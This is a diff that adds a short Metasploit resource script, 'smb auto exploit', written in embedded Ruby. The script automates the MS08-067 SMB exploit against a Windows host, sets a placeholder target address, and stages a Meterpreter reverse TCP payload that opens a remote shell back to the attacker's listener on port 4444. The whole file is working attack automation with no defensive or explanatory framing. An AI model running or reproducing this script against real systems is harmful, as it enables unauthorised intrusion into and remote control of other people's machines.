@@ -1,0 +1,66 @@
+#########################
+#smb_ae.rc		#
+#smb auto exploit	#
+#		~voodoo	#
+#########################
+
+<ruby>
+
+def load_exploit(epath)
+	framework.exploits.create(epath)
+end
+
+def load_payload(ppath)
+	framework.payloads.create(ppath)
+end
+
+def stage_exploit(exploit, rhost)
+	run_single("use #{exploit.fullname}")
+	run_single("set rhost #{rhost}")
+end
+
+def stage_payload(payload, lhost, lport)
+	run_single("set payload #{payload}")
+	run_single("set lhost #{lhost}")
+	run_single("set lport #{lport}")
+end
+
+def exploit(exploit, payload, rhost)
+	print_status("exploit => #{exploit.shortname} against remote host => #{rhost}\n")
+	print_status("payload => #{payload.shortname}")
+	run_single("exploit -j -z")
+	sleep(2)
+	##in case first exploit failed due to const_defined?
+	#run_single("exploit -j -z")
+	run_single("back")
+end
+
+begin
+
+	epath	= "windows/smb/ms08_067_netapi"
+	ppath	= "windows/meterpreter/reverse_tcp_allports"
+	lhost	= Rex::Socket.source_address('50.50.50.50')
+	lport	= 4444
+	rhost	= "10.0.0.100" #place holder address
+	
+	#load exploit
+	exploit=load_exploit(epath)
+	raise RuntimeError, "No module found for #{epath}" if exploit.nil?
+	#load payload
+	payload=load_payload(ppath)
+	raise RuntimeError, "No module found for #{ppath}" if payload.nil?
+
+	#stage
+	stage_exploit(exploit, rhost)
+	stage_payload(ppath, lhost, lport)
+
+	#auto exploit
+	exploit(exploit, payload, rhost)
+
+rescue RuntimeError => e
+	print_error("e.message")
+	return
+
+end
+
+</ruby>
